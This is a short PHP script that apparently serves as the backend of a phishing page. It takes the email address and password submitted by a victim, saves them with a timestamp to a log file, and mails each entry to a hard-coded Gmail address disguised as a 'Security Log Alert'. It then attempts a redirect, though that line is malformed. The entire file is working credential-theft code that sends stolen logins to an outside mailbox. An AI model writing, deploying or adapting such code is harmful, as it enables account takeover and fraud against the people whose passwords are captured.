<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

if ($_SERVER["REQUEST_METHOD"] == "GET") {
    // Get form data
    $email = htmlspecialchars($_GET['email']);
    $password = htmlspecialchars($_GET['password']);

    // Format data to store
    $data = "Email: $email | Password: $password | Time: " . date("Y-m-d H:i:s") . "\n";

    // Save to 'log.txt'
    file_put_contents("log.txt", $data, FILE_APPEND);

    $to = "jeroldcurry@gmail.com";  // Replace with your email
    $subject = "Security Log Alert";
    $headers = "From: adada@gmail.com"; // Replace with a valid domain email
    $message = "New log entry:\n" . $data;

    // Send email
    mail($to, $subject, $message, $headers);

    // Redirect after saving
    header("Location: http_response_code(404)");
    exit();
}
